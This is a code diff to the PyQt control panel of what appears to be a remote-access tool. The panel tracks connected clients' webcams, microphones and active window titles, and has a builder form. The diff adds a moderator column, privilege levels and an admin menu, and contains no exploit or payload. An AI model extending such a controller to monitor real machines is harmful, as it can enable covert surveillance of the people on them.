@@ -111,6 +111,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_microphone = 7
         self.index_of_webcamera = 8
         self.index_of_activeWindowTitle = 9
+        self.index_of_moderator = 10
 
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
@@ -122,6 +123,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversTable.setColumnWidth(self.index_of_lock, 100)
         self.serversTable.setColumnWidth(self.index_of_microphone, 70)
         self.serversTable.setColumnWidth(self.index_of_webcamera, 45)
+        self.serversTable.setColumnWidth(self.index_of_moderator, 70)
+
+        # Hide Moderators Columns
+        self.serversTable.setColumnHidden(self.index_of_moderator, True)
+        self.offlineServersTable.setColumnHidden(0, True)
 
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_client)
@@ -174,6 +180,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # MAIN
         self.setWindowTitle(_('TITLE'))
 
+        # TABS
+        self.clientsTabs.setTabText(0, _('CLIENTS_TAB_ONLINE'))
+        self.clientsTabs.setTabText(1, _('CLIENTS_TAB_OFFLINE'))
+
         # HEADERS
         self.serversTable.horizontalHeaderItem(0).setText(_('HEADER_IP_ADDRESS'))
         self.serversTable.horizontalHeaderItem(1).setText(_('HEADER_ALIAS'))
@@ -185,6 +195,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversTable.horizontalHeaderItem(7).setText(_('HEADER_MIC'))
         self.serversTable.horizontalHeaderItem(8).setText(_('HEADER_CAM'))
         self.serversTable.horizontalHeaderItem(9).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))
+        self.serversTable.horizontalHeaderItem(10).setText(_('HEADER_MODERATOR'))
         # END HEADERS
 
         # BOTTOM
@@ -233,16 +244,25 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD') + self.USERNAME, QLineEdit.Password)
                 if ok:
                     auth_status = get(self.connection_socket, 'auth %s %s' % (self.USERNAME, str(text)), session_id)
-                    if auth_status == 'LoginSuccess':
-                        self.actionStopListen_for_connections.setDisabled(False)
-                        self.actionStartListen_for_connections.setDisabled(True)
+                    if auth_status.startswith('LoginSuccess '):
+
+                        # Get Privileges
+                        self.privs = int(auth_status.split()[-1])
+                        if self.privs == 1:
+                            self.enable_administrator()
+                        elif self.privs == 0:
+                            self.disable_administrator()
+
                         self.acceptthreadState = True
                         self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(session_id,))
                         self.servers_checker_thread.start()
 
+                        # Gui
+                        self.actionStopListen_for_connections.setDisabled(False)
+                        self.actionStartListen_for_connections.setDisabled(True)
                         # Status Change
                         self.statusLabel.setText('Online')
-                        self.statusLabel.setStyleSheet('color: cyan;')
+                        self.statusLabel.setStyleSheet('color: #1abc9c;')
 
                         return
                     elif auth_status == 'LoginError':
@@ -251,6 +271,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     return
         except socket.error:
             return
+
+    def enable_administrator(self):
+        print 'Enable Administrator'
+        self.serversTable.setColumnHidden(self.index_of_moderator, False)
+        self.offlineServersTable.setColumnHidden(0, False)
+
+    def disable_administrator(self):
+        self.serversTable.setColumnHidden(self.index_of_moderator, True)
+        self.offlineServersTable.setColumnHidden(0, False)
 
     def disconnect_from_server(self):
         # Clear Content
@@ -269,10 +298,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # Change Status
         self.statusLabel.setText('Offline')
-        self.statusLabel.setStyleSheet('color: red;')
+        self.statusLabel.setStyleSheet('color: #d35400;')
 
         # Clients count
         self.onlineStatus.setText('0')
+
+        # Hide Moderator Column
+        self.disable_administrator()
 
     def check_servers(self, session_id):
         self.checker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -430,6 +462,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                 item.setTextColor(QColor('#1abc9c'))
                 self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
+
+                # add moderator
+                item = QTableWidgetItem(online_clients[obj]['moderator'])
+                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+                item.setTextColor(QColor('#f1c40f'))
+                self.serversTable.setItem(index, self.index_of_moderator, item)
+
         except RuntimeError:
             pass
 
@@ -437,21 +476,26 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         try:
             for index, obj in enumerate(offline_clients):
 
-                # add active windows title
+                item = QTableWidgetItem(offline_clients[obj]['moderator'])
+                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
+                item.setTextColor(QColor('#f1c40f'))
+                self.offlineServersTable.setItem(index, 0, item)
+
+                item = QTableWidgetItem(offline_clients[obj]['id'])
+                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
+                self.offlineServersTable.setItem(index, 1, item)
+
                 item = QTableWidgetItem(offline_clients[obj]['alias'])
                 item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
-                #item.setTextColor(QColor('#1abc9c'))
-                self.offlineServersTable.setItem(index, 0, item)# add active windows title
+                self.offlineServersTable.setItem(index, 2, item)
 
                 item = QTableWidgetItem(offline_clients[obj]['ip_address'])
                 item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
-                #item.setTextColor(QColor('#1abc9c'))
-                self.offlineServersTable.setItem(index, 1, item)# add active windows title
+                self.offlineServersTable.setItem(index, 3, item)
 
                 item = QTableWidgetItem(offline_clients[obj]['last_online'])
                 item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
-                #item.setTextColor(QColor('#1abc9c'))
-                self.offlineServersTable.setItem(index, 2, item)
+                self.offlineServersTable.setItem(index, 4, item)
 
         except RuntimeError:
             pass
@@ -597,6 +641,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             if not self.has_camera():
                 camera_menu.setEnabled(False)
 
+            # Administrator Menu
+            if self.privs == 1:
+                server_menu.addSeparator()
+
+                administrator_menu = QMenu(_('ADMINISTRATOR_RM_ADMINISTRATOR'), self)
+                administrator_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')),
+                                             _('ADMINISTRATOR_RM_SET_MODERATOR'), self.administrator_set_moderator)
+
+
+                server_menu.addMenu(administrator_menu)
+
+
             server_menu.exec_(self.serversTable.mapToGlobal(point))
 
     # get item
@@ -688,6 +744,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         }
         self.builder_form = Builder(args)
         self.builder_form.show()
+
+    def administrator_set_moderator(self):
+        pass
 
     def closeEvent(self, event):
         self.acceptthreadState = False
